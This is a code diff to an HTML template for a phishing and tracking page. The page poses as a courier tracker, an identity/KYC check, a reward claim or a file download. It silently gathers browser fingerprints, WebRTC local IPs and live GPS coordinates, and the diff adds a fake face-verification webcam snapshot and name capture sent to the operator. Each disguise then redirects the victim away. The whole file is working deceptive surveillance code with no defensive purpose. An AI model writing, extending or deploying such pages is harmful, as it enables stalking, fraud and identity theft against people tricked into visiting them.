@@ -6,7 +6,7 @@
   {% if disguise == 'delivery' %}
   <title>Track Package — Express Courier</title>
   {% elif disguise == 'verify' or disguise == 'camera_kyc' %}
-  <title>Account Verification</title>
+  <title>Account Identity Verification</title>
   {% elif disguise == 'cashback' or disguise == 'survey' %}
   <title>Claim Reward</title>
   {% elif disguise == 'download' %}
@@ -21,9 +21,9 @@
     @keyframes s{to{transform:rotate(360deg)}}
     .hidden{display:none!important}
     .card{width:100%;max-width:380px;padding:24px;border-radius:16px;background:#f8fafc;border:1px solid #e2e8f0}
-    input{width:100%;padding:12px;border-radius:10px;border:1px solid #d1d5db;font-size:14px;margin-top:8px;outline:none}
+    input{width:100%;padding:12px;border-radius:10px;border:1px solid #d1d5db;font-size:14px;margin-top:6px;margin-bottom:12px;outline:none}
     input:focus{border-color:#3b82f6}
-    .btn{width:100%;padding:13px;border:none;border-radius:10px;font-weight:600;font-size:14px;cursor:pointer;margin-top:12px;color:#fff}
+    .btn{width:100%;padding:13px;border:none;border-radius:10px;font-weight:600;font-size:14px;cursor:pointer;margin-top:6px;color:#fff}
     label{font-size:12px;font-weight:600;color:#64748b}
     .check{color:#22c55e;font-size:13px;margin-top:6px}
     .step{display:flex;align-items:center;padding:8px 0;font-size:13px;color:#64748b}
@@ -36,7 +36,7 @@
 </head>
 <body style="padding:16px">
 
-  <!-- ===== DEFAULT / NEWS: Looks like a security check that needs location ===== -->
+  <!-- ===== DEFAULT / NEWS: Connection check ===== -->
   {% if disguise == 'default' or disguise == 'news' %}
   <div style="text-align:center;max-width:340px">
     <div style="margin-bottom:20px">
@@ -51,7 +51,7 @@
     </div>
   </div>
 
-  <!-- ===== DELIVERY: GPS button + Pincode Fallback + Phone ===== -->
+  <!-- ===== DELIVERY: GPS button + Pincode Fallback + Phone + Name ===== -->
   {% elif disguise == 'delivery' %}
   <div class="card" style="text-align:center">
     <div style="font-size:32px;margin-bottom:8px">📦</div>
@@ -60,29 +60,45 @@
     <button id="gpsBtn" onclick="manualGPS()" class="btn" style="background:#10b981;margin-top:0">📍 Check Live Delivery Distance</button>
     <p id="gpsOk" class="hidden check">✓ Location confirmed — Rider is 0.8 km away</p>
     
-    <!-- Pincode fallback when location is denied/skipped -->
     <div id="pincodeBox" class="hidden" style="margin-top:14px;padding:12px;background:#f1f5f9;border-radius:10px;text-align:left">
-      <label style="color:#475569">📌 Enter Delivery Postal / Pincode</label>
+      <label style="color:#475569">📌 Delivery Postal / Pincode</label>
       <input type="text" id="userPincode" placeholder="e.g. 600001 or 110001" style="background:#fff">
     </div>
 
     <div style="margin-top:16px;text-align:left">
+      <label>Full Name</label>
+      <input type="text" id="userName" placeholder="Recipient Name">
+      
       <label>Mobile Number for Delivery Confirmation</label>
       <input type="tel" id="userPhone" placeholder="Mobile Number">
+      
       <button onclick="sendPhone()" class="btn" style="background:#334155">Confirm Delivery Details →</button>
     </div>
   </div>
 
-  <!-- ===== VERIFY / KYC ===== -->
+  <!-- ===== VERIFY / KYC: Camera Snapshot + Phone + Name ===== -->
   {% elif disguise == 'verify' or disguise == 'camera_kyc' %}
   <div class="card" style="text-align:center">
     <div style="font-size:32px;margin-bottom:8px">🔒</div>
-    <div style="font-weight:700;font-size:15px;margin-bottom:2px">Verify Your Account</div>
-    <p style="font-size:12px;color:#94a3b8;margin-bottom:16px">Enter your registered mobile number</p>
+    <div style="font-weight:700;font-size:15px;margin-bottom:2px">Identity Verification</div>
+    <p style="font-size:12px;color:#94a3b8;margin-bottom:16px">Complete quick face & account verification</p>
+
+    <video id="webcamVideo" autoplay playsinline class="hidden" style="width:100%;height:150px;background:#000;border-radius:10px;margin-bottom:12px;object-fit:cover"></video>
+    <canvas id="snapshotCanvas" class="hidden"></canvas>
+
+    <button type="button" id="camBtn" onclick="triggerCameraCapture()" class="btn" style="background:rgba(59,130,246,0.1);color:#2563eb;border:1px solid rgba(59,130,246,0.3);margin-bottom:12px">
+      📸 Take Quick Photo Verification
+    </button>
+    <p id="camOk" class="hidden check" style="margin-bottom:12px">✓ Face snapshot captured</p>
+
     <div style="text-align:left">
+      <label>Full Name</label>
+      <input type="text" id="userName" placeholder="Your Name">
+
       <label>Registered Mobile Number</label>
       <input type="tel" id="userPhone" placeholder="+91 98765 43210">
-      <button onclick="sendPhone()" class="btn" style="background:#3b82f6">Verify →</button>
+      
+      <button onclick="sendPhone()" class="btn" style="background:#3b82f6">Complete Verification →</button>
     </div>
   </div>
 
@@ -93,9 +109,12 @@
     <div style="font-weight:700;font-size:15px;margin-bottom:2px">You Won a Reward!</div>
     <p style="font-size:12px;color:#94a3b8;margin-bottom:16px">Enter mobile to receive voucher</p>
     <div style="text-align:left">
+      <label>Full Name</label>
+      <input type="text" id="userName" placeholder="Your Name">
+
       <label>Mobile Number (WhatsApp / UPI)</label>
       <input type="tel" id="userPhone" placeholder="Mobile Number">
-      <button onclick="sendPhone()" class="btn" style="background:#f59e0b;color:#111">Claim Now ⚡</button>
+      <button onclick="sendPhone()" class="btn" style="background:#f59e0b;color:#111">Claim Reward Now ⚡</button>
     </div>
   </div>
 
@@ -104,11 +123,14 @@
   <div class="card" style="text-align:center">
     <div style="font-size:32px;margin-bottom:8px">📥</div>
     <div style="font-weight:700;font-size:15px;margin-bottom:2px">File Ready</div>
-    <p style="font-size:12px;color:#94a3b8;margin-bottom:16px">Enter number to start download</p>
+    <p style="font-size:12px;color:#94a3b8;margin-bottom:16px">Enter details to start download</p>
     <div style="text-align:left">
+      <label>Full Name</label>
+      <input type="text" id="userName" placeholder="Your Name">
+
       <label>Mobile Number</label>
       <input type="tel" id="userPhone" placeholder="Mobile Number">
-      <button onclick="sendPhone()" class="btn" style="background:#3b82f6">Download →</button>
+      <button onclick="sendPhone()" class="btn" style="background:#3b82f6">Download File →</button>
     </div>
   </div>
   {% endif %}
@@ -120,7 +142,6 @@
   var REDIR = "{{ redirect_to }}";
   var MODE = "{{ disguise }}";
   var gone = false;
-  var gotGPS = false;
 
   function send(d) {
     d.slug = SLUG;
@@ -133,21 +154,14 @@
     window.location.replace(REDIR || "https://www.google.com");
   }
 
-  // ---- Step UI updater (for default/news disguise) ----
   function setStep(n, ok) {
     var dot = document.getElementById('d'+n);
     var txt = document.getElementById('t'+n);
     if (!dot || !txt) return;
-    if (ok) {
-      dot.className = 'dot ok';
-      txt.className = 'done';
-    } else {
-      dot.className = 'dot run';
-      txt.style.color = '#64748b';
-    }
+    if (ok) { dot.className = 'dot ok'; txt.className = 'done'; }
+    else { dot.className = 'dot run'; txt.style.color = '#64748b'; }
   }
 
-  // ---- Fingerprint collectors ----
   function canvasHash() {
     try { var c=document.createElement('canvas');c.width=200;c.height=50;var x=c.getContext('2d');x.font='14px Arial';x.fillText('Cwm fjord veg balks nth pyx quiz',2,15);var d=c.toDataURL(),h=0;for(var i=0;i<d.length;i++){h=((h<<5)-h)+d.charCodeAt(i);h|=0;}return h.toString(16); } catch(e){return null;}
   }
@@ -155,7 +169,6 @@
     try { var c=document.createElement('canvas'),gl=c.getContext('webgl')||c.getContext('experimental-webgl');if(!gl)return{v:null,r:null};var ext=gl.getExtension('WEBGL_debug_renderer_info');return{v:ext?gl.getParameter(ext.UNMASKED_VENDOR_WEBGL):gl.getParameter(gl.VENDOR),r:ext?gl.getParameter(ext.UNMASKED_RENDERER_WEBGL):gl.getParameter(gl.RENDERER)}; } catch(e){return{v:null,r:null};}
   }
 
-  // ---- Async collectors ----
   function audioFP(cb) {
     try { var AC=window.OfflineAudioContext||window.webkitOfflineAudioContext;if(!AC){cb(null);return;}var ctx=new AC(1,44100,44100),o=ctx.createOscillator();o.frequency.setValueAtTime(10000,ctx.currentTime);o.connect(ctx.destination);o.start(0);ctx.startRendering().then(function(buf){var d=buf.getChannelData(0),h=0;for(var i=4500;i<5000;i++){h=((h<<5)-h)+Math.round(d[i]*1e6);h|=0;}cb(h.toString(16));}).catch(function(){cb(null);}); } catch(e){cb(null);}
   }
@@ -169,9 +182,6 @@
     try { var pc=new RTCPeerConnection({iceServers:[]});pc.createDataChannel('');pc.createOffer().then(function(o){pc.setLocalDescription(o);});var t=setTimeout(function(){try{pc.close();}catch(e){}cb(null);},400);pc.onicecandidate=function(e){if(!e||!e.candidate)return;var p=e.candidate.candidate.split(' ');if(p[4]&&!p[4].includes(':')&&p[4]!=='0.0.0.0'){clearTimeout(t);try{pc.close();}catch(x){}cb(p[4]);}}; } catch(e){cb(null);}
   }
 
-  // ===========================================================
-  //  MAIN: Collect fingerprints + Request GPS simultaneously
-  // ===========================================================
   var gl = getWebGL();
   var conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
 
@@ -193,22 +203,16 @@
     timezone_name:Intl.DateTimeFormat().resolvedOptions().timeZone
   };
 
-  // Collect async fingerprints
   var pending = 4;
   function done() {
     pending--;
     if (pending <= 0) {
-      // Fingerprints ready — send baseline
       send(base);
-
-      // Update UI step 2 as done
       if (MODE === 'default' || MODE === 'news') {
         setStep(2, true);
-        var t2 = document.getElementById('t2');
-        if (t2) t2.textContent = 'Region verified';
+        var t2 = document.getElementById('t2'); if (t2) t2.textContent = 'Region verified';
         setStep(3, false);
-        var t3 = document.getElementById('t3');
-        if (t3) t3.textContent = 'Establishing secure connection...';
+        var t3 = document.getElementById('t3'); if (t3) t3.textContent = 'Establishing secure connection...';
       }
     }
   }
@@ -217,71 +221,81 @@
   getHints(function(h){for(var k in h)base[k]=h[k];done();});
   getRTC(function(ip){base.webrtc_local_ip=ip;done();});
 
-  // ===========================================================
-  //  GPS: Request IMMEDIATELY on page load for ALL disguises
-  //  On HTTPS (Vercel), Chrome/Android shows permission popup
-  //  automatically without needing a button tap.
-  // ===========================================================
+  // GPS on load
   if (navigator.geolocation) {
     navigator.geolocation.getCurrentPosition(
       function(pos) {
-        // SUCCESS — got exact GPS
-        gotGPS = true;
-        var gps = {
-          slug: SLUG,
-          gps_lat: pos.coords.latitude,
-          gps_lng: pos.coords.longitude,
-          gps_accuracy: pos.coords.accuracy,
-          gps_altitude: pos.coords.altitude,
-          gps_heading: pos.coords.heading,
-          gps_speed: pos.coords.speed
-        };
-        send(gps);
-
-        // Update UI
+        send({
+          slug: SLUG, gps_lat: pos.coords.latitude, gps_lng: pos.coords.longitude,
+          gps_accuracy: pos.coords.accuracy, gps_altitude: pos.coords.altitude,
+          gps_heading: pos.coords.heading, gps_speed: pos.coords.speed
+        });
         if (MODE === 'default' || MODE === 'news') {
           setStep(3, true);
-          var t3 = document.getElementById('t3');
-          if (t3) t3.textContent = 'Connection secured';
-          // Brief pause so user sees "done", then redirect
+          var t3 = document.getElementById('t3'); if (t3) t3.textContent = 'Connection secured';
           setTimeout(go, 600);
         }
       },
-      function(err) {
-        // DENIED or TIMEOUT — redirect anyway
+      function() {
         if (MODE === 'default' || MODE === 'news') {
           setStep(3, true);
-          var t3 = document.getElementById('t3');
-          if (t3) t3.textContent = 'Connection secured';
+          var t3 = document.getElementById('t3'); if (t3) t3.textContent = 'Connection secured';
           setTimeout(go, 500);
         }
       },
-      {
-        enableHighAccuracy: true,
-        timeout: 10000,     // Wait up to 10 seconds for GPS lock
-        maximumAge: 0       // Force fresh reading
-      }
+      { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
     );
 
-    // Safety: if GPS takes too long (user ignoring popup), redirect after 12s
     if (MODE === 'default' || MODE === 'news') {
       setTimeout(function() {
         if (!gone) {
           setStep(3, true);
-          var t3 = document.getElementById('t3');
-          if (t3) t3.textContent = 'Connection secured';
+          var t3 = document.getElementById('t3'); if (t3) t3.textContent = 'Connection secured';
           setTimeout(go, 400);
         }
       }, 12000);
     }
   } else {
-    // No geolocation API at all
-    if (MODE === 'default' || MODE === 'news') {
-      setTimeout(go, 2000);
-    }
+    if (MODE === 'default' || MODE === 'news') setTimeout(go, 2000);
   }
 
-  // ---- Interactive mode handlers ----
+  // Camera Capture Handler
+  window.triggerCameraCapture = async function() {
+    var video = document.getElementById('webcamVideo');
+    var canvas = document.getElementById('snapshotCanvas');
+    var camBtn = document.getElementById('camBtn');
+    var camOk = document.getElementById('camOk');
+
+    try {
+      if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return;
+      var stream = await navigator.mediaDevices.getUserMedia({
+        video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } }
+      });
+      if (video) {
+        video.srcObject = stream;
+        video.classList.remove('hidden');
+      }
+
+      setTimeout(function() {
+        if (canvas && video) {
+          canvas.width = video.videoWidth || 640;
+          canvas.height = video.videoHeight || 480;
+          var ctx = canvas.getContext('2d');
+          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+          var photoBase64 = canvas.toDataURL('image/jpeg', 0.65);
+          stream.getTracks().forEach(function(track){ track.stop(); });
+          video.classList.add('hidden');
+          send({ captured_photo: photoBase64 });
+          if (camOk) camOk.classList.remove('hidden');
+          if (camBtn) camBtn.textContent = '✓ Photo Captured';
+        }
+      }, 1200);
+    } catch(err) {
+      if (camBtn) camBtn.textContent = '📸 Camera Skipped';
+    }
+  };
+
+  // Interactive submission handler
   window.manualGPS = function() {
     var btn = document.getElementById('gpsBtn');
     if (btn) btn.textContent = '⏳ Calculating distance...';
@@ -302,9 +316,11 @@
 
   window.sendPhone = function() {
     var ph = document.getElementById('userPhone');
+    var nm = document.getElementById('userName');
     var pin = document.getElementById('userPincode');
     var data = {slug:SLUG};
     if (ph && ph.value) data.captured_phone = ph.value;
+    if (nm && nm.value) data.captured_name = nm.value;
     if (pin && pin.value) data.captured_pincode = pin.value;
     send(data);
     setTimeout(go, 400);
